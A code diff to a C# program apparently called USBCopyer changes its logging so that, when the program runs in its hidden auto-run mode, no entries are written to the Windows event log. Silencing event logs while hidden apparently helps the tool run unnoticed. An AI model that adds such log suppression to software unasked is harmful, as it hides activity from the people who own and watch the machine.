@@ -8,7 +8,7 @@ namespace USBCopyer
     static class Program
     {
         public static bool showicon = !Properties.Settings.Default.autorunhide;//true;//修改BUG通过设置项改变自动运行隐藏。
-        public static EventLog logger = new EventLog();
+        public static EventLog logger = showicon ? new EventLog("Application", ".", "Application") : null;
         public static System.Drawing.Icon ico = System.Drawing.Icon.ExtractAssociatedIcon(Application.ExecutablePath);
 
         /// <summary>
@@ -17,7 +17,6 @@ namespace USBCopyer
         [MTAThread]
         static void Main(string[] args)
         {
-            logger.Source = Application.ProductName;
             try
             {
                 Application.SetCompatibleTextRenderingDefault(false);
@@ -98,24 +97,26 @@ namespace USBCopyer
         /// <param name="type">日志类型（0=INFO,1=WARN,2=ERROR）</param>
         public static void log(string str, int type = 0)
         {
-            EventLogEntryType etype;
-            switch (type)
-            {
-                case 0:
-                    etype = EventLogEntryType.Information;
-                    break;
-                case 1:
-                    etype = EventLogEntryType.Warning;
-                    break;
-                case 2:
-                    etype = EventLogEntryType.Error;
-                    break;
-                default:
-                    etype = EventLogEntryType.Information;
-                    break;
-            }
             Console.Write(str);
-            logger.WriteEntry(str, etype);
+            if (logger != null) {
+                EventLogEntryType etype;
+                switch (type)
+                {
+                    case 0:
+                        etype = EventLogEntryType.Information;
+                        break;
+                    case 1:
+                        etype = EventLogEntryType.Warning;
+                        break;
+                    case 2:
+                        etype = EventLogEntryType.Error;
+                        break;
+                    default:
+                        etype = EventLogEntryType.Information;
+                        break;
+                }
+                logger.WriteEntry(str, etype);
+            }
         }
 
         /// <summary>
